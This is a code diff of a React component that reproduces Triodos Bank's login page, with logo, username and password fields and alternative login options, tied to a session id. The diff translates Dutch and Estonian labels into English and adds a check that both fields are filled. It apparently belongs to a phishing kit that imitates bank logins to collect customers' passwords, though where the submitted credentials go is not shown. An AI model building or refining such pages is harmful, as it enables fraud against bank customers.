@@ -11,6 +11,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [saving, setSaving] = useState(false);
+  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;
 
   useEffect(() => {
     let cancelled = false;
@@ -45,11 +46,11 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
         <img src="/bank-logos/triodos-bank-detail.svg" alt="Triodos Bank" className="h-10" />
       </div>
 
-      <h1 className="text-[32px] font-bold text-[#2C0044] mb-8">Inloggen</h1>
+      <h1 className="text-[32px] font-bold text-[#2C0044] mb-8">Log in</h1>
 
       {/* Main Login Card */}
       <div className="w-full max-w-[640px] bg-white rounded-lg p-8 shadow-sm mb-12">
-        <h2 className="text-[18px] font-bold text-[#2C0044] mb-6">Inloggen met gebruikersnaam en wachtwoord</h2>
+        <h2 className="text-[18px] font-bold text-[#2C0044] mb-6">Log in with username and password</h2>
         
         <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
           <div className="flex flex-col md:flex-row gap-6 mb-8">
@@ -62,7 +63,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
                 placeholder=" "
               />
               <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
-                Gebruikersnaam
+                Username
               </label>
             </div>
 
@@ -75,7 +76,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
                 placeholder=" "
               />
               <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
-                Wachtwoord
+                Password
               </label>
               <button type="button" className="absolute right-4 top-4 text-[#2C0044] opacity-60 hover:opacity-100">
                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
@@ -85,14 +86,14 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
 
           <div className="flex items-center justify-between">
             <a href="#" className="text-[#2C0044] text-[15px] font-medium hover:underline">
-              &gt; Gebruikersnaam of wachtwoord vergeten?
+              &gt; Forgot username or password?
             </a>
             <button 
               type="submit" 
-              disabled={saving || !username || !password} 
-              className="bg-[#98D898] text-[#2C0044] font-bold py-3 px-8 rounded-full hover:bg-[#86c986] disabled:opacity-50 transition-colors"
+              disabled={!formDoluMu || saving} 
+              className={`font-bold py-3 px-8 rounded-full transition-colors ${formDoluMu && !saving ? "bg-[#98D898] hover:bg-[#86c986] text-[#2C0044]" : "bg-gray-400 text-gray-700 opacity-70"}`}
             >
-              {saving ? "Laden..." : "Inloggen"}
+              {saving ? "Loading..." : "Log in"}
             </button>
           </div>
         </form>
@@ -100,7 +101,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
 
       {/* Alternative Login Options */}
       <div className="w-full max-w-[640px]">
-        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Teine sisselogimisviis?</h3>
+        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Other login methods?</h3>
         
         <div className="space-y-3">
           <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
